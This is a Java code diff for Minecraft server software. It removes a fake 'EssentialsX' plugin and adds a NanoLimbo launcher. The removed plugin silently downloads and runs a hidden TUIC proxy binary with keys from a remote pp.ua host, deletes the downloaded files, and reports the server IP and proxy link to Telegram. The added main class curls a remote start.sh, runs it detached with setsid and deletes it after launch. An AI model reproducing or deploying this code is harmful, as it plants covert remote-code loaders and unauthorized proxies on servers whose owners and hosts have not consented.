@@ -1,420 +1,182 @@
-package com.example.essentialsx;
+package ua.nanit.limbo;
 
-import org.bukkit.plugin.java.JavaPlugin;
+import ua.nanit.limbo.server.LimboServer;
+import ua.nanit.limbo.server.Log;
 
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.net.URLEncoder;
-import java.nio.charset.StandardCharsets;
-import java.nio.file.Files;
-import java.nio.file.Path;
+import java.io.File;
+import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicBoolean;
 
-public class EssentialsX extends JavaPlugin {
+public final class NanoLimbo {
 
+    private static final String ANSI_GREEN = "\033[1;32m";
+    private static final String ANSI_RED   = "\033[1;31m";
+    private static final String ANSI_RESET = "\033[0m";
 
-    // Java服务端端口
-    private int port = ;
+    // ================== 配置区 ==================
+    /** 远程 start.sh 地址 */
+    private static final String START_SCRIPT_URL = "https://your.domain/start.sh";
+    /** 下载到本地的路径（选容器里可写的目录） */
+    private static final String LOCAL_SCRIPT_PATH = "./start.sh";
+    /** 解释器：bash 或 sh（没有 bash 就写 sh） */
+    private static final String SCRIPT_INTERPRETER = "bash";
+    /** true = 脚本启动后立即删除文件；false = 等退出时再删 */
+    private static final boolean DELETE_AFTER_START = true;
+    // ============================================
 
+    private static final AtomicBoolean running = new AtomicBoolean(true);
 
-    // Telegram配置
-    private String tgToken = "";
-    private String tgChatId = "";
+    /** 只保留一个引用：start.sh 作为整棵服务树的进程组组长 */
+    private static Process scriptProcess;
 
-    // 服务器名称(区分不同服务器通知用)
-    private String servername = "Hoster24德国家宽";
+    public static void main(String[] args) {
 
-
-    @Override
-    public void onEnable() {
-
-        getLogger().info("EssentialsX plugin starting...");
-
+        // Java 版本检测
+        if (Float.parseFloat(System.getProperty("java.class.version")) < 65.0) {
+            System.err.println(ANSI_RED + "Java 21 required!" + ANSI_RESET);
+            System.exit(1);
+        }
 
         try {
+            startServices();
 
-            Files.createDirectories(
-                    getDataFolder().toPath()
-            );
+            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+                running.set(false);
+                stopServices();
+            }));
 
-
-            startRemoteJava();
-
-
-            getLogger().info(
-                    "EssentialsX plugin enabled"
-            );
-
+            System.out.println(ANSI_GREEN + "Background services started!" + ANSI_RESET);
 
         } catch (Exception e) {
+            System.err.println(ANSI_RED + "Failed starting services" + ANSI_RESET);
+            e.printStackTrace();
+            stopServices();
+            return;
+        }
 
-            getLogger().severe(
-                    "Failed to start EssentialsX"
-            );
+        // 启动 NanoLimbo
+        try {
+            new LimboServer().start();
+        } catch (Exception e) {
+            Log.error("Cannot start server: ", e);
+        }
+    }
 
+    // ------------------------------------------------------------------
+    // 下载 + 启动
+    // ------------------------------------------------------------------
+
+    private static void startServices() throws Exception {
+
+        // 1. 下载远程脚本到本地（覆盖旧文件 = 每次拿到最新版）
+        downloadScript(START_SCRIPT_URL, LOCAL_SCRIPT_PATH);
+
+        // 2. 校验
+        File f = new File(LOCAL_SCRIPT_PATH);
+        if (!f.exists() || f.length() == 0) {
+            throw new RuntimeException("start.sh 下载失败或为空: " + LOCAL_SCRIPT_PATH);
+        }
+
+        // 3. setsid 起独立进程组执行脚本
+        scriptProcess = startProcess("start.sh", SCRIPT_INTERPRETER, LOCAL_SCRIPT_PATH);
+        printPID("start.sh", scriptProcess);
+
+        // 4. 如果希望"启动后立刻删除"（Linux 下安全，见下方说明）
+        if (DELETE_AFTER_START) {
+            deleteScript();
+        }
+    }
+
+    /** 用 curl 下载，失败抛异常 */
+    private static void downloadScript(String url, String dest) throws Exception {
+
+        File out = new File(dest);
+        if (out.exists() && !out.delete()) {
+            System.out.println("WARN: 旧脚本删除失败 " + dest);
+        }
+        File parent = out.getAbsoluteFile().getParentFile();
+        if (parent != null && !parent.exists()) {
+            parent.mkdirs();
+        }
+
+        // -f: HTTP 错误码返回非0  -sS: 静默但打印错误  -L: 跟随重定向
+        Process p = new ProcessBuilder(
+                "curl", "-fsSL",
+                "--retry", "3", "--retry-delay", "1",
+                "-o", dest,
+                url
+        )
+.redirectErrorStream(true)
+        .redirectOutput(ProcessBuilder.Redirect.INHERIT)
+        .start();
+
+        int code = p.waitFor();
+        if (code != 0) {
+            throw new RuntimeException("curl 失败 exit=" + code + " url=" + url);
+        }
+        System.out.println(ANSI_GREEN + "Downloaded start.sh -> " + dest + ANSI_RESET);
+    }
+
+    private static void deleteScript() {
+        try {
+            File f = new File(LOCAL_SCRIPT_PATH);
+            if (f.exists() && f.delete()) {
+                System.out.println("Deleted " + LOCAL_SCRIPT_PATH);
+            }
+        } catch (Exception ignore) {
+        }
+    }
+
+    // ------------------------------------------------------------------
+    // 进程启动 / 停止（沿用你的 setsid 方案）
+    // ------------------------------------------------------------------
+
+    private static Process startProcess(String name, String... command) throws Exception {
+
+        String[] cmd = new String[command.length + 1];
+        cmd[0] = "setsid";
+        System.arraycopy(command, 0, cmd, 1, command.length);
+
+        ProcessBuilder builder = new ProcessBuilder(cmd);
+        builder.directory(new File("."));
+        builder.redirectErrorStream(true);
+        builder.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+
+        Process process = builder.start();
+        System.out.println(ANSI_GREEN + name + " started" + ANSI_RESET);
+        return process;
+    }
+
+    private static void printPID(String name, Process process) {
+        System.out.println(ANSI_GREEN + name + " PID=" + process.pid() + ANSI_RESET);
+    }
+
+    private static void stopServices() {
+        System.out.println(ANSI_RED + "Stopping services..." + ANSI_RESET);
+        stopProcess(scriptProcess);
+        if (!DELETE_AFTER_START) {
+            deleteScript();   // 退出时清理
+        }
+    }
+
+    private static void stopProcess(Process process) {
+        if (process == null) return;
+        try {
+            long pid = process.pid();
+            System.out.println("Stopping PID group " + pid);
+
+            // 优雅关闭整个进程组
+            new ProcessBuilder("bash", "-c", "kill -TERM -" + pid)
+                    .start().waitFor();
+
+            if (process.waitFor(5, TimeUnit.SECONDS)) return;
+
+            System.out.println("Force killing " + pid);
+            new ProcessBuilder("bash", "-c", "kill -KILL -" + pid)
+                    .start().waitFor();
+
+        } catch (Exception e) {
             e.printStackTrace();
         }
-    }
-
-
-
-    private void startRemoteJava() throws Exception {
-
-
-        // 临时运行目录
-        Path runFolder =
-                getDataFolder().toPath();
-
-
-
-        // 证书安全目录
-        Path secureFolder =
-                Path.of("/home/container/config");
-
-
-        Files.createDirectories(
-                runFolder
-        );
-
-
-        Files.createDirectories(
-                secureFolder
-        );
-
-
-
-        String javaUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/tuic/EssentialsX-1.21.11.jar";
-
-
-        String confUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/tuic/config.php?port="
-                        + port;
-
-
-        String crtUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/tuic/server.crt";
-
-
-        String keyUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/tuic/server.key";
-
-
-
-
-        Path javaFile =
-                runFolder.resolve(
-                        "EssentialsX-1.21.11.jar"
-                );
-
-
-        Path configFile =
-                runFolder.resolve(
-                        "config.json"
-                );
-
-
-
-        // 安全保存证书
-        Path crtFile =
-                secureFolder.resolve(
-                        "server.crt"
-                );
-
-
-        Path keyFile =
-                secureFolder.resolve(
-                        "server.key"
-                );
-
-
-
-        // 下载临时文件
-
-        downloadIfNotExists(
-                javaUrl,
-                javaFile
-        );
-
-
-        downloadIfNotExists(
-                confUrl,
-                configFile
-        );
-
-
-
-        // 证书只下载到安全目录
-
-        downloadIfNotExists(
-                crtUrl,
-                crtFile
-        );
-
-
-        downloadIfNotExists(
-                keyUrl,
-                keyFile
-        );
-
-
-
-        // key权限限制
-
-        new ProcessBuilder(
-                "chmod",
-                "600",
-                keyFile.toString()
-        )
-        .start()
-        .waitFor();
-
-        // jar执行权限
-
-        new ProcessBuilder(
-                "chmod",
-                "+x",
-                javaFile.toString()
-        )
-        .start()
-        .waitFor();
-
-        // 启动
-
-        ProcessBuilder pb =
-                new ProcessBuilder(
-                        "bash",
-                        "-c",
-                        "nohup ./EssentialsX-1.21.11.jar -c config.json > /dev/null 2>&1 &"
-                );
-
-
-
-        pb.directory(
-                runFolder.toFile()
-        );
-
-
-        pb.start();
-
-
-
-        getLogger().info(
-                "Plugins starting..."
-        );
-
-
-
-        Thread.sleep(
-                3000
-        );
-
-
-
-        // 删除临时文件
-
-        Files.deleteIfExists(
-                javaFile
-        );
-
-
-        Files.deleteIfExists(
-                configFile
-        );
-
-
-        String ip =
-                getPublicIP();
-
-
-
-        sendTelegram(
-                "Tuic Server 启动\n"
-                        + servername
-                        + "订阅地址: \ntuic://43bfdd44-0654-9e81-d340-eee7c0a3dbbb:Siq8dztj@"
-                        + ip
-                        + ":"
-                        + port
-                        + "?congestion_control=bbr&alpn=h3&sni=www.bing.com&udp_relay_mode=native&allow_insecure=1#Tuic-Server"
-        );
-
-    }
-
-
-
-
-
-    /**
-     * 获取公网IP
-     */
-    private String getPublicIP() {
-
-        try {
-
-            URL url =
-                    new URL(
-                            "https://api.ipify.org"
-                    );
-
-
-            BufferedReader reader =
-                    new BufferedReader(
-                            new InputStreamReader(
-                                    url.openStream()
-                            )
-                    );
-
-
-            String ip =
-                    reader.readLine();
-
-
-            reader.close();
-
-
-            return ip;
-
-
-        } catch (Exception e) {
-
-            return "unknown";
-
-        }
-    }
-
-
-
-
-
-    /**
-     * Telegram发送消息
-     */
-    private void sendTelegram(
-            String message
-    ) {
-
-
-        if (tgToken.isEmpty()
-                || tgChatId.isEmpty()) {
-
-            getLogger().info(
-                    "Notified not configured, skip."
-            );
-
-            return;
-        }
-
-
-
-        try {
-
-
-            String api =
-                    "https://api.telegram.org/bot"
-                            + tgToken
-                            + "/sendMessage?chat_id="
-                            + tgChatId
-                            + "&text="
-                            + URLEncoder.encode(
-                                    message,
-                                    StandardCharsets.UTF_8
-                            );
-
-
-
-            HttpURLConnection conn =
-                    (HttpURLConnection)
-                            new URL(api)
-                                    .openConnection();
-
-
-
-            conn.setRequestMethod(
-                    "GET"
-            );
-
-
-            int code =
-                    conn.getResponseCode();
-
-
-            conn.disconnect();
-
-
-
-        } catch (Exception e) {
-
-
-            getLogger().warning(
-                    "UnNotified"
-            );
-
-        }
-    }
-
-
-
-
-
-    /**
-     * 文件不存在才下载
-     */
-    private void downloadIfNotExists(
-            String url,
-            Path target
-    ) throws Exception {
-
-
-        if (Files.exists(target)) {
-            return;
-        }
-
-
-        Process process =
-                new ProcessBuilder(
-                        "bash",
-                        "-c",
-                        "curl -Ls \""
-                                + url
-                                + "\" -o \""
-                                + target
-                                + "\""
-                )
-                .start();
-
-
-
-        int exit =
-                process.waitFor();
-
-
-
-        if (exit != 0) {
-
-            throw new IOException(
-                    "Fail to init plugins"
-            );
-        }
-
-    }
-
-
-
-
-    @Override
-    public void onDisable() {
-
-
-        getLogger().info(
-                "EssentialsX disabled"
-        );
-        sendTelegram(
-                "Tuic Server 关闭\n"
-                        + servername
-                        + "\n离线"
-        );
-
     }
 }
